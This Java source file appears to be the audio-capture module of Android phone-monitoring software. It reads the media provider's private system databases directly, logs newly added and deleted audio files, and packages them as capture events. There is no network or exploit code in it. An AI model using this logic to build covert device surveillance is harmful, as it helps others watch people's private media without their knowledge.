package com.vvt.capture.audio;

import java.io.File;
import java.util.ArrayList;
import java.util.Date;
import java.util.HashMap;
import java.util.List;
import java.util.Map;

import android.database.Cursor;
import android.database.sqlite.SQLiteDatabase;
import android.database.sqlite.SQLiteException;
import android.provider.BaseColumns;
import android.provider.MediaStore.MediaColumns;
import android.provider.MediaStore.Audio.AudioColumns;

import com.vvt.base.FxEvent;
import com.vvt.events.FxAudioFileThumnailEvent;
import com.vvt.events.FxMediaDeletedEvent;
import com.vvt.events.FxMediaType;
import com.vvt.events.FxMimeTypeParser;
import com.vvt.ioutil.FileUtil;
import com.vvt.logger.FxLog;

public class FxAudioHelper {
	private final static String TAG = "FxAudioHelper";
	private static final boolean LOGV = Customization.VERBOSE;
	private static final boolean LOGD = Customization.DEBUG;
	private static final boolean LOGE = Customization.ERROR;
	
	private final static File [] FOLDER_DIRS  =  {
		new File("/data/data/com.android.providers.media/databases/"),
		new File("/dbdata/databases/com.android.providers.media/"), // Samgsung
	};
	
	private final static String INTERNAL_FILENAME_START_PREFIX = "internal";
	private final static String EXTERNAL_FILENAME_START_PREFIX = "external";
	
	//set to public for media_history capture use it.
	public static final String AUDIO_TABLE_NAME = "audio";

	public static SQLiteDatabase getReadableDatabase(String dbFile) {
		return openDatabase(dbFile, SQLiteDatabase.OPEN_READONLY | SQLiteDatabase.NO_LOCALIZED_COLLATORS);
	}
	
	public static SQLiteDatabase getWritableDatabase(String dbFile) {
		return openDatabase(dbFile, SQLiteDatabase.OPEN_READWRITE | SQLiteDatabase.NO_LOCALIZED_COLLATORS);
	}
	
	/*private static SQLiteDatabase openDatabase(String dbFile, int flags) {
		if(LOGV) FxLog.v(TAG, "openDatabase # ENTER ...");
		
		String dbPath = VtDatabaseHelper.getSystemDatabasePath(PACKAGE_NAME);
		if (dbPath != null) {
			dbPath = String.format("%s/%s", dbPath, dbFile);
		}
		
		if(LOGD) FxLog.d(TAG, String.format("openDatabase # sDbPath: %s", dbPath));
		
		SQLiteDatabase db = tryOpenDatabase(dbPath, flags);
		
		int attemptLimit = 5;
		
		while (db == null && attemptLimit > 0) {
			if(LOGD) FxLog.d(TAG, "Cannot open database. Retrying ...");
			try {
				Thread.sleep(1000);
			} 
			catch (InterruptedException e) {
				// Do nothing
			}
			
			db = tryOpenDatabase(dbPath, flags);
			
			attemptLimit--;
		}
		
		if(LOGV) FxLog.v(TAG, "openDatabase # EXIT ...");
		return db;
	}*/
	
	private static SQLiteDatabase openDatabase(String dbFile, int flags) {
		if(LOGV) FxLog.v(TAG, "openDatabase # START");
		
		SQLiteDatabase db = tryOpenDatabase(dbFile, flags);
		
		int attemptLimit = 5;
		
		while (db == null && attemptLimit > 0) {
			if(LOGV) FxLog.d(TAG, "Cannot open database. Retrying ...");
			try {
				Thread.sleep(1000);
			} 
			catch (InterruptedException e) {
				// Do nothing
			}
			
			db = tryOpenDatabase(dbFile, flags);
			
			attemptLimit--;
		}
		
		if(LOGV) FxLog.v(TAG, "openDatabase # EXIT");
		return db;
	}
	
	private static SQLiteDatabase tryOpenDatabase(String dbPath, int flags) {
		SQLiteDatabase db = null;
		try {
			
			if(!new File(dbPath).exists()) {
				if(LOGE) FxLog.e(TAG, dbPath + " does not exist!");
				return db;
			}
			
			db = SQLiteDatabase.openDatabase(dbPath, null, flags);
		}
		catch (SQLiteException e) {
			if(LOGE) FxLog.e(TAG, null, e);
		}
		return db;
	}
	
	public static String getExternalDatabaseFilePath() {
		if(LOGV) FxLog.v(TAG, "getExternalDatabaseFilePath # START");
	 
		StringBuilder foundPath = new StringBuilder();
		boolean isSuccess = FileUtil.findFileInFolders(FOLDER_DIRS, EXTERNAL_FILENAME_START_PREFIX, foundPath, "db");
		
		if(!isSuccess)
			if(LOGE) FxLog.e(TAG, "getExternalDatabaseFilePath # ExternalDatabaseFilePath Not found!");
		else
			if(LOGD) FxLog.d(TAG, "getExternalDatabaseFilePath # filePath :" + foundPath.toString());
		
		if(LOGV) FxLog.v(TAG, "getExternalDatabaseFilePath # EXIT");
		return foundPath.toString();
	}
	
	public static String getInternalDatabaseFilePath() {
		if(LOGV) FxLog.v(TAG, "getInternalDatabaseFilePath # START");

		StringBuilder foundPath = new StringBuilder();
		boolean isSuccess = FileUtil.findFileInFolders(FOLDER_DIRS, INTERNAL_FILENAME_START_PREFIX, foundPath, "db");
		
		
		if(!isSuccess)
			if(LOGE) FxLog.e(TAG, "getInternalDatabaseFilePath # getInternalDatabaseFilePath Not found!");
		else
			if(LOGD) FxLog.d(TAG, "getInternalDatabaseFilePath # filePath :" + foundPath.toString());
		
		if(LOGV) FxLog.v(TAG, "getInternalDatabaseFilePath # EXIT");
		return foundPath.toString();
	}

	public static ArrayList<FxEvent> getWhatsNew(String writablePath, String dbFile, HashMap<Long, String> oldMap, HashMap<Long, String> newMap) {
		if(LOGV) FxLog.v(TAG, "getWhatsNew # START");
		
		ArrayList<FxEvent> newEvents = new ArrayList<FxEvent>();

		if(oldMap == null || newMap == null)
			return newEvents;
		
		for (Map.Entry<Long, String> e : newMap.entrySet()) {
			if (!oldMap.keySet().contains(e.getKey())) {
				// Is a new id. query
				long AudioId = e.getKey();
				if(LOGV) FxLog.v(TAG, "getWhatsNew # new AudioId:" + AudioId);
				
				List<FxEvent> events = getNewerMediaById(writablePath, dbFile, AudioId);
				newEvents.addAll(events);
			}
		}

		if(LOGV) FxLog.v(TAG, "getWhatsNew # EXIT");
		return newEvents;
	}
	
	public static List<FxEvent> getNewerMediaById(String writablePath, String dbFile, long refId) {
		if(LOGV) FxLog.v(TAG, "getNewerMediaById # START");
		
		if(LOGV) FxLog.v(TAG, "getNewerMediaById # writablePath:" + writablePath);
		if(LOGV) FxLog.v(TAG, "getNewerMediaById # dbFile:" + dbFile);
		if(LOGV) FxLog.v(TAG, "getNewerMediaById # refId:" + refId);
		
		List<FxEvent> medias = new ArrayList<FxEvent>();

		String selection = String.format("%s = %d", FxAudioDatabaseHelper._ID, refId);
		
		SQLiteDatabase db =  getReadableDatabase(dbFile);
		Cursor cursor = null;
		
		try {
			cursor = db.query(AUDIO_TABLE_NAME, null, selection, null, null, null, null);
			
			if (cursor == null) {
				return null;
			}

			FxAudioFileThumnailEvent media = null;

			while (cursor.moveToNext()) {
				int orginRowId = cursor.getInt(cursor.getColumnIndexOrThrow(BaseColumns._ID));
				String fileName = cursor.getString(cursor.getColumnIndexOrThrow(MediaColumns.DATA));
				String mimeType = cursor.getString(cursor.getColumnIndexOrThrow(MediaColumns.MIME_TYPE));
				FxMediaType format = FxMimeTypeParser.parse(mimeType);
				long eventTime = new Date().getTime();
				int actualFileSize = cursor.getInt(cursor.getColumnIndexOrThrow(MediaColumns.SIZE));
				int actualDuration = cursor.getInt(cursor.getColumnIndexOrThrow(AudioColumns.DURATION));
				byte[] data = null;

				File f = new File(fileName); 
				if (!f.exists()) {
					continue;
				}

				media = new FxAudioFileThumnailEvent();
				media.setEventId(orginRowId);
				media.setEventTime(eventTime);
				media.setFormat(format);
				media.setParingId(orginRowId);
				media.setActualDuration(actualDuration);
				media.setAudioData(data);
				media.setActualFileSize(actualFileSize);
				media.setActualFullPath(fileName);
				
				if(media != null)
					medias.add(media);
			}

		}
		finally {
			if(cursor != null)
				cursor.close();
			
			if(db != null)
				db.close();
		}
		
		if(LOGV) FxLog.v(TAG, "getNewerMediaById # EXIT");
		return medias;
	}
	 
	public static ArrayList<FxEvent> getWhatsDeleted(HashMap<Long, String> oldMap, HashMap<Long, String> newMap) {
		ArrayList<FxEvent> newEvents = new ArrayList<FxEvent>();

		if (oldMap == null || newMap == null)
			return newEvents;

		for (Map.Entry<Long, String> e : oldMap.entrySet()) {
			if (!newMap.keySet().contains(e.getKey())) {
				// Is a new id. query
				long AudioId = e.getKey();
				FxMediaDeletedEvent mediaDeletedEvent = new FxMediaDeletedEvent();
				mediaDeletedEvent.setEventId(AudioId);
				mediaDeletedEvent.setFileName(e.getValue());
				mediaDeletedEvent.setEventTime(new Date().getTime());
				newEvents.add(mediaDeletedEvent);
			}
		}

		return newEvents;
	}
	 
	public synchronized static HashMap<Long, String> getAllAudios(String dbFile) throws NullPointerException {
		if(LOGV) FxLog.v(TAG, "getAllAudios # START");
		if(LOGV) FxLog.v(TAG, "getAllAudios # db:" + dbFile);
		
		HashMap<Long, String> map = new HashMap<Long, String>();
		
		long id = -1;
		String path = "";
		SQLiteDatabase db = getReadableDatabase(dbFile);
		Cursor cursor = null;
		
		try {
			if (db == null || db.isDbLockedByCurrentThread() || db.isDbLockedByOtherThreads()) {
				if(LOGV) FxLog.v(TAG, "getAllAudios # Open database FAILED!! -> EXIT ...");
				if (db != null) {
					db.close();
				}
				return map;
			}
			
			String sql = String.format("SELECT %s, %s FROM %s", FxAudioDatabaseHelper._ID,  FxAudioDatabaseHelper.PATH, AUDIO_TABLE_NAME);
			if(LOGV) FxLog.v(TAG, "getAllAudios # db sql is: " + sql);
			
			cursor = db.rawQuery(sql, null);

			if (cursor == null) {
				if(LOGE) FxLog.e(TAG, "getAllAudios # cursor is null");
				return map;
			}

			while (cursor.moveToNext()) {
				id = cursor.getLong(cursor.getColumnIndex(FxAudioDatabaseHelper._ID));
				path = cursor.getString(cursor.getColumnIndex(FxAudioDatabaseHelper.PATH));
				map.put(id, path);
			}
			
			if(LOGV) FxLog.v(TAG, "getAllAudios # cursor count:" + cursor.getCount());

			cursor.close();
		} catch (Exception e) {
			if(LOGE) FxLog.e(TAG, e.toString());
		}
		finally {
			if(cursor != null)
				cursor.close();
			
			if(db != null)
				db.close();
		}

		if(LOGV) FxLog.v(TAG, "getAllAudios # map size:" + map.size());
		if(LOGV) FxLog.v(TAG, "getAllAudios # EXIT");
		return map;
	}

}
